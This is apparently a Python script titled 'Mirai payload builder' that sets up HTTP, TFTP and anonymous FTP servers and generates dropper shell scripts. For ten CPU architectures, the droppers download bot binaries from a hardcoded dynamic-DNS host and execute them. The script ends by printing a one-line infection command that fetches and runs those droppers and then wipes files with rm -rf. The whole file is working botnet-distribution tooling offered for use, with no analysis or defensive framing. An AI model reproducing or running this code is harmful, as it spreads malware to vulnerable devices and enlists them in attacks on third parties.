"""

 _____________________________________
|                                     |
|        MIRAI PAYLOAD BUILDER        |
|          Made By DaddyL33T          |
|_____________________________________|

"""
import subprocess, sys, urllib
ip = "hasd7as6d23gh4.duckdns.org:8088"
exec_bin = "SSH scanner"
bin_prefix = "3atoNational."
bin_directory = "389242390482"
archs = ["x86",               #1
"mips",                       #2
"mpsl",                       #3
"arm4",                       #4
"arm5",                       #5
"arm6",                       #6
"arm7",                       #7
"ppc",                        #8
"m68k",                       #9
"sh4"]                        #10
def run(cmd):
    subprocess.call(cmd, shell=True)
print("Setting up HTTP TFTP and FTP for your payload")
print(" ")
run("yum install httpd -y &> /dev/null")
run("service httpd start &> /dev/null")
run("yum install xinetd tftp tftp-server -y &> /dev/null")
run("yum install vsftpd -y &> /dev/null")
run("service vsftpd start &> /dev/null")
run('''echo "service tftp
{
	socket_type             = dgram
	protocol                = udp
	wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')	
run("service xinetd start &> /dev/null")
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart &> /dev/null")
run("service xinetd restart &> /dev/null")
print("Creating .sh Bins")
print(" ")
run('echo "#!/bin/bash" > /var/lib/tftpboot/zatoempire.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/zatoempire.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/zatoempire.sh')
run('echo "#!/bin/bash" > /var/lib/tftpboot/zatoempire2.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/zatoempire2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/zatoempire2.sh')
run('echo "#!/bin/bash" > /var/www/html/zatoempire.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/zatoempire2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/zatoempire2.sh')
run('echo "#!/bin/bash" > /var/ftp/zatoempire1.sh')
run('echo "ulimit -n 1024" >> /var/ftp/zatoempire1.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/zatoempire1.sh')
for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/www/html/zatoempire.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' '+bin_prefix+i+' '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/ftp/zatoempire1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/lib/tftpboot/zatoempire.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + ';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/lib/tftpboot/zatoempire2.sh')    
run("service xinetd restart &> /dev/null")
run("service httpd restart &> /dev/null")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')
print("\x1b[0;32mPayload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/zatoempire.sh; curl -O http://" + ip + "/zatoempire.sh; chmod 777 zatoempire.sh; sh zatoempire.sh; tftp " + ip + " -c get zatoempire.sh; chmod 777 zatoempire.sh; sh zatoempire.sh; tftp -r zatoempire2.sh -g " + ip + "; chmod 777 zatoempire2.sh; sh zatoempire2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " zatoempire1.sh zatoempire1.sh; sh zatoempire1.sh; rm -rf zatoempire.sh zatoempire.sh zatoempire2.sh zatoempire1.sh; rm -rf *\x1b[0m")
print("")
raw_input("press any key to exit....")
